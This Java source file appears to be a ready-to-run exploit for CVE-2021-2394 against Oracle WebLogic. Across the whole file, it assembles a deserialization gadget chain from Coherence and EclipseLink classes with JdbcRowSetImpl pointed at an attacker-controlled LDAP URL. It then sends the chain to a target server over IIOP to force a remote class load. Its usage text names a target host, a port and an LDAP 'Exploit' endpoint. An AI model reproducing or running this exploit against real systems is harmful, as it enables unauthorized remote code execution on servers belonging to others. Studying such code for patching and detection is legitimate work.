import com.nqzero.permit.Permit;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;
import oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor;
import org.eclipse.persistence.exceptions.DescriptorException;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
import org.eclipse.persistence.mappings.AttributeAccessor;
import sun.applet.Main;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.*;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;


public class CVE_2021_2394 {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static void main(String[] args) throws Exception {

        String ldapurl = null;
        String rhost = null;
        try {
            String ip = args[0];
            String port = args[1];
            ldapurl = args[2];
            rhost = String.format("iiop://%s:%s", ip, port);
        } catch (Exception e) {
            System.out.println("请输入正确的格式：");
            System.out.println("java -jar CVE_2021_2394.jar rhost rport ldapurl");
            System.out.println("java -jar CVE_2021_2394.jar 192.168.137.1 7001 ldap://192.168.137.1:8087/Exploit");
            System.exit(0);
        }

        try {
            System.out.println("[*] Attacking...");
            MethodAttributeAccessor accessor = new MethodAttributeAccessor();
            accessor.setAttributeName("Timeline Sec");
            accessor.setGetMethodName("connect");
            accessor.setSetMethodName("setConnection");

            JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(JdbcRowSetImpl.class);
            jdbcRowSet.setDataSourceName(ldapurl);

            FilterExtractor extractor = new FilterExtractor(accessor);
            FilterExtractor extractor1 = new FilterExtractor(new TLSAttributeAccessor());

            SortedBag sortedBag = new TopNAggregator.PartialResult(extractor1, 2);
            AttributeHolder attributeHolder = new AttributeHolder();
            sortedBag.add(jdbcRowSet);

            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(sortedBag, extractor);

            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, sortedBag);


//            Test locally:
//            FileOutputStream fileOutputStream = new FileOutputStream(new File("test.ser"));
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
//            objectOutputStream.writeObject(attributeHolder);
//
//            readObject();

            Hashtable<String, String> env = new Hashtable<String, String>();
            env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
            env.put("java.naming.provider.url", rhost);
            Context context = new InitialContext(env);

            Remote remote = createMemoitizedProxy(createMap("Timeline Sec", attributeHolder), Remote.class);
            context.rebind("Timeline Sec", remote);
        } catch (Exception e) {
            if (e.getMessage().equals("Unhandled exception in rebind()")){
                System.out.println("[*] 发包成功 请自行检查是否利用成功");
            }else {
                e.printStackTrace();
            }
        }
    }


    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }

    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Main.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static class TLSAttributeAccessor extends AttributeAccessor {

        public Object getAttributeValueFromObject(Object o) throws DescriptorException {
            return this.attributeName;
        }

        public void setAttributeValueInObject(Object o, Object o1) throws DescriptorException {
            this.attributeName = "Timeline Sec";
        }
    }

    public static void readObject() {
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(new File("").getAbsolutePath() + "/test.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
